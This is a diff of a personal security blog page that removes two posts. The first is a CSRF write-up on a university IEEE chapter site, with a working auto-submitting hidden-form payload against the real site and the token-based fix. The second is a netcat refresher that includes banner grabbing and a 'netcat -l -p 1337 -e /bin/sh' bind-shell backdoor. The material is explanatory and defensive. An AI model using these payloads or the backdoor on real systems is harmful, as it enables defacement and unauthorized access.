-<p>Initially, I started looking for the most blatant web vulns, SQLi and XSS, but
-was pleasantly surprised to find in the <code>register.php</code> file, for example, that
-handles user registration, to find a input sanitation check.</p>
-
-<div class="highlight"><pre><code class="language-php" data-lang="php"><span class="k">if</span> <span class="p">((</span><span class="nx">isValid</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;newusername&#39;</span><span class="p">]))</span><span class="o">&amp;&amp;</span><span class="p">(</span><span class="nx">isValid</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;newpassword&#39;</span><span class="p">])))</span>
-<span class="p">{</span>
-    <span class="c1">// continue with registration</span>
-<span class="p">}</span></code></pre></div>
-
-
-<p>where <code>isValid()</code> looks like</p>
-
-<div class="highlight"><pre><code class="language-php" data-lang="php"><span class="k">function</span> <span class="nf">isValid</span><span class="p">(</span><span class="nv">$varx</span><span class="p">)</span>
-<span class="p">{</span>
-    <span class="nv">$valid</span> <span class="o">=</span> <span class="k">true</span><span class="p">;</span>
-    <span class="nv">$bad_stuff</span> <span class="o">=</span> <span class="k">array</span><span class="p">(</span><span class="s2">&quot;#&quot;</span><span class="p">,</span><span class="s2">&quot;(&quot;</span><span class="p">,</span><span class="s2">&quot;)&quot;</span><span class="p">,</span><span class="s2">&quot;&lt;&quot;</span><span class="p">,</span><span class="s2">&quot;&gt;&quot;</span><span class="p">,</span><span class="s2">&quot;?&quot;</span><span class="p">,</span><span class="s2">&quot;/&quot;</span><span class="p">,</span><span class="s2">&quot;</span><span class="se">\\</span><span class="s2">&quot;</span><span class="p">,</span><span class="s2">&quot;[&quot;</span><span class="p">,</span><span class="s2">&quot;]&quot;</span><span class="p">,</span><span class="s2">&quot;|&quot;</span><span class="p">,</span><span class="s2">&quot;$&quot;</span><span class="p">,</span><span class="s2">&quot;&#39;&quot;</span><span class="p">,</span><span class="s2">&quot;:&quot;</span><span class="p">,</span><span class="s2">&quot;;&quot;</span><span class="p">,</span> <span class="s2">&quot;@&quot;</span><span class="p">);</span>
-    <span class="k">for</span><span class="p">(</span><span class="nv">$index</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="nv">$index</span> <span class="o">&lt;</span> <span class="nb">strlen</span><span class="p">(</span><span class="nv">$varx</span><span class="p">);</span> <span class="nv">$index</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
-        <span class="k">if</span><span class="p">(</span><span class="nb">in_array</span><span class="p">(</span><span class="nb">substr</span><span class="p">(</span><span class="nv">$varx</span><span class="p">,</span><span class="nv">$index</span><span class="p">,</span><span class="mi">1</span><span class="p">),</span> <span class="nv">$bad_stuff</span><span class="p">))</span> <span class="p">{</span>
-            <span class="nv">$valid</span> <span class="o">=</span> <span class="k">false</span><span class="p">;</span>
-        <span class="p">}</span>
-    <span class="p">}</span>
-    <span class="k">if</span><span class="p">(</span><span class="nb">substr</span><span class="p">(</span><span class="nv">$varx</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">1</span><span class="p">)</span> <span class="o">==</span> <span class="s2">&quot; &quot;</span><span class="p">)</span> <span class="p">{</span>
-        <span class="nv">$valid</span> <span class="o">=</span> <span class="k">false</span><span class="p">;</span>
-    <span class="p">}</span>
-    <span class="k">return</span> <span class="nv">$valid</span><span class="p">;</span>
-<span class="p">}</span></code></pre></div>
-
-
-<p>This code has a pretty substantial blacklist of commonly used characters in
-injections and operates by iterating over each character of the questionable
-input and testing if the character is in the blacklist, if so, setting the
-<code>$valid</code> variable to false. This seems to be an effective technique at ensuring
-the input is safe to use, however OWASP tends to <a href="https://www.owasp.org/index.php/Data_Validation#Data_Validation_Strategies">discourage</a>
-this model.</p>
-
-<p>After ruling this out of potential vulns, I looked a little deeper into the code
-that powered the posting of news to the website, <code>add-news.php</code>.</p>
-
-<p>Here we can see that if the HTTP request is a &ldquo;POST&rdquo; and the PHP session variables
-&ldquo;isadmin&rdquo; and &ldquo;isofficer&rdquo; are set to &ldquo;yessir&rdquo; and &ldquo;true&rdquo; respectively, then
-the code that adds news gets executed.</p>
-
-<div class="highlight"><pre><code class="language-php" data-lang="php"><span class="k">if</span> <span class="p">(</span><span class="nv">$_SERVER</span><span class="p">[</span><span class="s1">&#39;REQUEST_METHOD&#39;</span><span class="p">]</span> <span class="o">==</span> <span class="s2">&quot;POST&quot;</span><span class="p">)</span>
-    <span class="p">{</span>
-        <span class="k">include</span><span class="p">(</span><span class="s2">&quot;ieee-lib.php&quot;</span><span class="p">);</span>
-        <span class="k">if</span><span class="p">(</span><span class="nb">isset</span><span class="p">(</span><span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">&#39;isadmin&#39;</span><span class="p">])</span> <span class="o">||</span> <span class="nb">isset</span><span class="p">(</span><span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">&#39;isofficer&#39;</span><span class="p">]))</span>
-        <span class="p">{</span>
-            <span class="k">if</span><span class="p">(</span><span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">&#39;isadmin&#39;</span><span class="p">]</span> <span class="o">==</span> <span class="s2">&quot;yessir&quot;</span> <span class="o">||</span> <span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">&#39;isofficer&#39;</span><span class="p">]</span> <span class="o">==</span> <span class="s2">&quot;true&quot;</span><span class="p">)</span>
-            <span class="p">{</span>
-                <span class="c1">// add news</span></code></pre></div>
-
-
-<p>After these access checks pass, the POST request data is processed and
-ultimately a SQL query string is generated.</p>
-
-<div class="highlight"><pre><code class="language-php" data-lang="php"><span class="c1">// continued from above</span>
-<span class="nv">$title</span> <span class="o">=</span> <span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;news_title&#39;</span><span class="p">],</span> <span class="nx">ENT_QUOTES</span><span class="p">);</span>
-<span class="nv">$text</span> <span class="o">=</span> <span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;post&#39;</span><span class="p">],</span> <span class="nx">ENT_QUOTES</span><span class="p">);</span>
-<span class="p">{</span> <span class="o">...</span> <span class="p">}</span> <span class="c1">// some omitted stuff</span>
-<span class="nv">$user_query</span> <span class="o">=</span> <span class="s2">&quot;SELECT user_id, username FROM &quot;</span> <span class="o">.</span> <span class="nv">$INFO</span><span class="p">[</span><span class="s1">&#39;sql_prefix&#39;</span><span class="p">]</span> <span class="o">.</span> <span class="s2">&quot;users WHERE username = &#39;&quot;</span> <span class="o">.</span> <span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">&#39;username&#39;</span><span class="p">]</span> <span class="o">.</span> <span class="s2">&quot;&#39;&quot;</span><span class="p">;</span>
-<span class="nv">$user_result</span> <span class="o">=</span> <span class="nb">mysql_query</span><span class="p">(</span><span class="nv">$user_query</span><span class="p">);</span>
-<span class="k">if</span><span class="p">(</span><span class="nv">$user_result</span><span class="p">)</span>
-<span class="p">{</span>
-    <span class="c1">//Returns an array with the data from the SQL select statement</span>
-    <span class="nv">$user_row</span> <span class="o">=</span> <span class="nb">mysql_fetch_row</span><span class="p">(</span><span class="nv">$user_result</span><span class="p">);</span>
-
-    <span class="nv">$query1</span> <span class="o">=</span> <span class="s2">&quot;INSERT INTO &quot;</span> <span class="o">.</span> <span class="nv">$INFO</span><span class="p">[</span><span class="s1">&#39;sql_prefix&#39;</span><span class="p">]</span> <span class="o">.</span> <span class="s2">&quot;news (news_title, news_type, time_posted, time_meeting, news_body, author_id, author_name, meeting_location) &quot;</span><span class="p">;</span>
-    <span class="nv">$query2</span> <span class="o">=</span> <span class="s2">&quot;VALUES (&#39;&quot;</span> <span class="o">.</span> <span class="nv">$title</span> <span class="o">.</span> <span class="s2">&quot;&#39;, &#39;&quot;</span> <span class="o">.</span> <span class="nv">$type_of_news</span> <span class="o">.</span> <span class="s2">&quot;&#39;, &#39;&quot;</span> <span class="o">.</span> <span class="nb">time</span><span class="p">()</span> <span class="o">.</span> <span class="s2">&quot;&#39;, &#39;&quot;</span> <span class="o">.</span> <span class="nv">$time_of_meeting</span> <span class="o">.</span> <span class="s2">&quot;&#39;, &#39;&quot;</span> <span class="o">.</span> <span class="nv">$text</span> <span class="o">.</span> <span class="s2">&quot;&#39;, &#39;&quot;</span> <span class="o">.</span> <span class="nv">$user_row</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">.</span> <span class="s2">&quot;&#39;, &#39;&quot;</span> <span class="o">.</span> <span class="nv">$user_row</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">.</span> <span class="s2">&quot;&#39;, &#39;&quot;</span> <span class="o">.</span> <span class="nv">$meetinglocation</span> <span class="o">.</span> <span class="s2">&quot;&#39;)&quot;</span><span class="p">;</span>
-    <span class="nv">$add_news_query</span> <span class="o">=</span> <span class="nv">$query1</span> <span class="o">.</span> <span class="nv">$query2</span><span class="p">;</span>
-    <span class="nv">$add_news_result</span> <span class="o">=</span> <span class="nb">mysql_query</span><span class="p">(</span><span class="nv">$add_news_query</span><span class="p">);</span>
-
-    <span class="k">if</span><span class="p">(</span><span class="nv">$add_news_result</span><span class="p">)</span>
-    <span class="p">{</span>
-        <span class="nb">header</span><span class="p">(</span><span class="s1">&#39;Location: http://www.ieee.neu.edu/?page=addnews&amp;success=true&#39;</span><span class="p">);</span>
-    <span class="p">}</span>
-    <span class="k">else</span>
-    <span class="p">{</span>
-        <span class="nb">header</span><span class="p">(</span><span class="s1">&#39;Location: http://www.ieee.neu.edu/?page=addnews&amp;error=unable_to_post_news&#39;</span><span class="p">);</span>
-    <span class="p">}</span>
-<span class="p">}</span>
-<span class="c1">// done</span></code></pre></div>
-
-
-<p>The important part to notice here is that there is no code that ensures the
-legitimacy of the request, that is, that a currently authenticated admin
-user actually meant to make this request. In this scenario if we can somehow
-find a way to get the admin to
-submit an arbitrary POST request to the <code>add-news.php</code> page, since she already
-has the session all set up in her browser, we can bypass the session checks
-previously shown and add arbitrary news to the website, for example.</p>
-
-<p>You might be wondering how we can get the admin to submit arbitrary POST requests
-without her noticing. The most obvious answer is physical access to the her
-machine while she&rsquo;s away or something, but a much more realistic scenario
-would be if we would get the admin
-to browse to a web page that we (the attacker) control, we can use some nifty
-JavaScript magic to get her to automatically submit the proper POST request
-on our behalf.</p>
-
-<p>This is called <a href="https://www.owasp.org/index.php/Cross-Site_Request_Forgery_(CSRF">Cross Site Request Forgery</a>).</p>
-
-<p>It turns out that these types of malicious pages are actually very simple
-to write. Remember, all that&rsquo;s really needed is JavaScript execution, so
-for example if you had previous knowledge of a site that the admin frequented
-that had an XSS vulnerability, that would be a perfect way to chain these attacks.
-Anyway, here&rsquo;s an example malicious page <sup id="fnref:1"><a href="#fn:1" rel="footnote">1</a></sup>.</p>
-
-<div class="highlight"><pre><code class="language-html" data-lang="html"><span class="cp">&lt;!DOCTYPE HTML&gt;</span>
-<span class="nt">&lt;html&gt;</span>
-<span class="nt">&lt;body&gt;</span>
-    <span class="nt">&lt;h1&gt;</span>non-malicious website! :)<span class="nt">&lt;/h1&gt;</span>
-    <span class="nt">&lt;form</span> <span class="na">id=</span><span class="s">&quot;thisform&quot;</span> <span class="na">action=</span><span class="s">&quot;http://www.ieee.neu.edu/add-news.php&quot;</span> <span class="na">method=</span><span class="s">&quot;POST&quot;</span>
-          <span class="na">style=</span><span class="s">&quot;display:none;&quot;</span><span class="nt">&gt;</span>
-        <span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">&quot;text&quot;</span> <span class="na">name=</span><span class="s">&quot;news_title&quot;</span> <span class="na">value=</span><span class="s">&quot;breaking news: u got hacked&quot;</span> <span class="nt">/&gt;</span>
-        <span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">&quot;text&quot;</span> <span class="na">name=</span><span class="s">&quot;post&quot;</span> <span class="na">value=</span><span class="s">&quot;insert website defacement here&quot;</span> <span class="nt">/&gt;</span>
-        <span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">&quot;submit&quot;</span><span class="nt">/&gt;</span>
-    <span class="nt">&lt;/form&gt;</span>
-    <span class="nt">&lt;script </span><span class="na">type=</span><span class="s">&quot;text/javascript&quot;</span> <span class="na">charset=</span><span class="s">&quot;utf-8&quot;</span><span class="nt">&gt;</span>
-        <span class="kd">var</span> <span class="nx">frm</span> <span class="o">=</span> <span class="nb">document</span><span class="p">.</span><span class="nx">getElementById</span><span class="p">(</span><span class="s2">&quot;thisform&quot;</span><span class="p">);</span>
-        <span class="nx">frm</span><span class="p">.</span><span class="nx">submit</span><span class="p">();</span>
-    <span class="nt">&lt;/script&gt;</span>
-<span class="nt">&lt;/body&gt;</span>
-<span class="nt">&lt;/html&gt;</span></code></pre></div>
-
-
-<p>Nothing fancy here, just a simple hidden form with the values you want to submit
-to the page, and some JS that submits the form.</p>
-
-<p>A caveat: Yes, it is true that you would
-have to guess the proper field names (&ldquo;posts&rdquo;, &ldquo;news_title&rdquo;) but even if you can
-only guess &ldquo;posts&rdquo;, you can write anything into the body of the news post.</p>
-
-<p>End result looks something like this.</p>
-
-<p><img src="/images/ieee_csrf.gif" alt="" /></p>
-
-<p>There was an identical bug in the code that handles editing users. Let&rsquo;s
-have some fun!</p>
-
-<p><img src="/images/ieee_csrf2.gif" alt="" /></p>
-
-<p>In both of these gifs, the admin user was logged in, and then they opened
-a malicious html file, simulating visiting a malicious website. The mere act of
-opening the web page triggered the payload which sent the POST to the server,
-adding the news, and changing the user.</p>
-
-<p>So how do we fix this sort of thing? The most common way involves the server
-requiring a randomly generated, non-predictable token that is associated with
-the user session with each request. An example could be that every time the
-actual admin web interface form is loaded, it contains a hidden field, invisible
-to the admin, with this token that is sent along with the request. The server
-verifies that it sent this token out previously, and that the token hasn&rsquo;t expired,
-and if everything else checks out, the request goes through.
-This crucial missing piece of information will prevent attackers from
-successfully faking requests as the authenticated user.</p>
-<div class="footnotes">
-<hr/>
-<ol>
-<li id="fn:1">
-<p>For more examples of how to trigger your CSRF payload via JavaScript, check out the excellent <a href="http://edgeguides.rubyonrails.org/security.html#cross-site-request-forgery-csrf">Ruby on Rails Security Guide</a><a href="#fnref:1" rev="footnote">&#8617;</a></p></li>
-</ol>
-</div>
-
-</div>
-  
-  
-
-
-    </article>
-  
-  
-    <article>
-      
-  <header>
-    
-      <h1 class="entry-title"><a href="/blog/2014/03/05/netcat/">Netcat Refresher</a></h1>
-    
-    
-      <p class="meta">
-        
-
-
-
-
-<time class='entry-date' datetime='2014-03-05'><span class='date'><span class='date-month'>Mar</span> <span class='date-day'>5</span><span class='date-suffix'>th</span>, <span class='date-year'>2014</span></span> <span class='time'>12:00 am</span></time>
-        
-      </p>
-    
-  </header>
-
-
-  <div class="entry-content"><p><em>Quick overview of the legendary Unix tool, netcat, with examples and applications</em></p>
-
-<h2>Introduction</h2>
-
-<p><a href="https://en.wikipedia.org/wiki/Netcat">Netcat</a> is a great tool for all things networking and is commonly nicknamed &ldquo;the TCP/IP Swiss-army knife&rdquo; due to its versatility and utility. An absolute must-know for sysadmins and hackers. In this article, I&rsquo;ll go over a few common uses I have for it that I frequently forget after not using it for a while, primarily for my own personal reference.</p>
-
-<p>Before I begin, I should point out that there are a few variants on netcat that have slightly different options and behaviors but are all essentially the same in &ldquo;spirit and functionality&rdquo;, as the <a href="http://nmap.org/ncat/">ncat</a> man page describes it.</p>
-
-<p>The original netcat comes from the OpenBSD package and was written by &ldquo;Hobbit&rdquo;. This is the default version that comes with OS X and Ubuntu. The version that I use and will cover is the standard GNU Netcat, by Giovanni Giacobbi, which is a rewrite of the original. This available using <a href="http://brew.sh">brew</a> on OS X. On Ubuntu it&rsquo;s called &ldquo;netcat-traditional&rdquo; which you can <code>apt-get</code> and then run with <code>nc.traditional</code>. Lastly, there is <a href="http://nmap.org/ncat">ncat</a>, which is a netcat implementation by our friends from the <a href="http://nmap.org">nmap</a> team. It is designed to modernize netcat and adds features like SSL, IPv6, and proxying which aren&rsquo;t available in the original(s).</p>
-
-<h2>Usage</h2>
-
-<p>At its core, netcat is a tool for creating arbitrary TCP connections, which looks like</p>
-
-<pre><code>$ netcat [host] [port]
-</code></pre>
-
-<p>where host is either an IP Address or a domain name, and port is the TCP port to connect to.</p>
-
-<p>You can also use netcat to do the reverse: listen for arbitrary TCP connections. This looks like</p>
-
-<pre><code>$ netcat -l -p [port] [host]
-</code></pre>
-
-<p>Here, host is an optional parameter which lets you limit what host can create connections.</p>
-
-<h4>Example: Chat</h4>
-
-<p>Using these two behaviors, we can create a crude chat system. One one host, listen for connections on a port.</p>
-
-<pre><code>$ netcat -l -p 1337
-</code></pre>
-
-<p>On the same one, in another terminal, connect to it on that port.</p>
-
-<pre><code>$ nc localhost 1337
-</code></pre>
-
-<p>There won&rsquo;t be a prompt, but when you enter text and press enter, it will appear in the other terminal. You can just as easily do this between different hosts and have a super basic chat setup.</p>
-
-<p><img src="https://draftin.com:443/images/12181?token=V4hz4Qtwi_uM_-4ulkErwUudxL_qY8D2yxx-fPjLSffSc8-FV0FOVRlvd4psBi-fLricHlJLjufBWr6E91R_spQ" alt="" /></p>
-
-<h3>Example: Curl-like behavior</h3>
-
-<p>You can also use netcat to emulate curl and interact with HTTP servers. Connect to the server on port 80 (or whatever port it&rsquo;s running on) and you can then type out the HTTP request to send to it. When you&rsquo;re finished, hit enter twice and it will send.</p>
-
-<pre><code>[mark:~]{ nc example.org 80
-GET / HTTP/1.1
-
-HTTP/1.1 400 Bad Request
-Content-Type: text/html
-Content-Length: 349
-Connection: close
-Date: Wed, 05 Mar 2014 20:15:42 GMT
-Server: ECSF (mdw/1383)
-
-&lt;?xml version="1.0" encoding="iso-8859-1"?&gt;
-&lt;!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN"
-"http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd"&gt;
-&lt;html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en" lang="en"&gt;
-&lt;head&gt;
-&lt;title&gt;400 - Bad Request&lt;/title&gt;
-&lt;/head&gt;
-&lt;body&gt;
-&lt;h1&gt;400 - Bad Request&lt;/h1&gt;
-&lt;/body&gt;
-&lt;/html&gt;
-</code></pre>
-
-<p>As you can see here, we sent a bare-bones HTTP request (<code>GET / HTTP/1.1</code>) which was successfully sent to the server. The server responded with a 400, because our request didn&rsquo;t contain enough information, but that&rsquo;s not important; if we had filled in the right headers, it would have responded with the home page for example.org.</p>
-
-<h2>For Hackers</h2>
-
-<p>There are two applications for netcat that I find particularly useful in pen-testing situations.</p>
-
-<h3>Recon</h3>
-
-<p>The first is helpful for the recon stage, which is essentially getting information on your target. Sometimes network services may give away version information when an arbitrary network connection is made. For example, OpenSSH by default gives away it&rsquo;s version information as well as information on the host, when you connect. For example,</p>
-
-<pre><code>$ netcat 1.2.3.4 22
-SSH-2.0-OpenSSH_5.9p1 Debian-5ubuntu1.1
-</code></pre>
-
-<p>is typically what you might see. For an attacker, this is pretty valuable stuff! MySQL behaves similarly.</p>
-
-<pre><code>$ netcat 1.2.3.4 3306
-J
-5.5.33-.?2|&gt;\8��@x\E$"zeic2lmysql_native_password
-</code></pre>
-
-<p>The output isn&rsquo;t as clear as OpenSSH, but we can confirm that MySQL is indeed running, and we can infer that the version is &ldquo;5.5.33&rdquo;. For information on removing these banners, check out my <a href="http://blog.mark.lc/blog/2014/01/10/banner-hiding/">blog post</a> on it.</p>
-
-<h3>Persistence/Access</h3>
-
-<p>The other application is when you have achieved command execution, but not exactly shell access. You can use netcat to create a nifty backdoor which you can externally connect to. To create the backdoor, we&rsquo;ll use the <code>-e</code> flag to tell netcat to execute a binary on receiving a connection. We want a shell, so we&rsquo;ll say <code>-e /bin/sh</code>. The whole command will look like:</p>
-
-<pre><code>$ netcat -l -p 1337 -e /bin/sh
-</code></pre>
-
-<p>which will give you a backdoor on port 1337, which will then let you run commands upon connecting to that port. For a good example, check out my other <a href="http://blog.mark.lc/blog/2014/03/01/ihackedit/">blog post</a> where I actually used this.</p>
-
-<h2>Conclusion</h2>
-
-<p>That was a quick overview of netcat including its basic functionality and some example use cases. Thanks for reading!</p>
-</div>
-  
-  
-
-
-    </article>
-  
   <div class="pagination">
     
       <a class="prev" href="/posts/2">&larr; Older</a>
@@ -2248,23 +1610,23 @@ J
   <ul id="recent_posts">
     
       <li class="post">
+        <a href="/blog/2015/08/18/asking-what-if-with-open/">Asking What if With Open</a>
+      </li>
+    
+      <li class="post">
+        <a href="/blog/2015/08/14/learning-trivia-about-mach0/">Buffers and Binary Formats</a>
+      </li>
+    
+      <li class="post">
+        <a href="/blog/2015/08/13/solving-cmu-binary-bomb-with-r2/">Solving Cmu Binary Bomb With R2</a>
+      </li>
+    
+      <li class="post">
+        <a href="/blog/2015/08/12/playing-with-vdso/">Playing With Vdso</a>
+      </li>
+    
+      <li class="post">
         <a href="/blog/2015/06/14/building-a-simple-iot-light-switch/">Building a Simple IoT Light Switch, Pt. 2</a>
-      </li>
-    
-      <li class="post">
-        <a href="/blog/2015/06/07/off-to-the-python-internals-races/">Off to the (Python Internals) Races</a>
-      </li>
-    
-      <li class="post">
-        <a href="/blog/2015/04/25/building-a-sketchy-website-101/">Building a Sketchy Website 101</a>
-      </li>
-    
-      <li class="post">
-        <a href="/blog/2015/01/18/a-simple-iot-light-switch/">Building a Simple IoT Light Switch</a>
-      </li>
-    
-      <li class="post">
-        <a href="/blog/2014/12/13/poet-beacon-based-post-exploitation/">Poet: Beacon Based Post-Exploitation</a>
       </li>
     
   </ul>
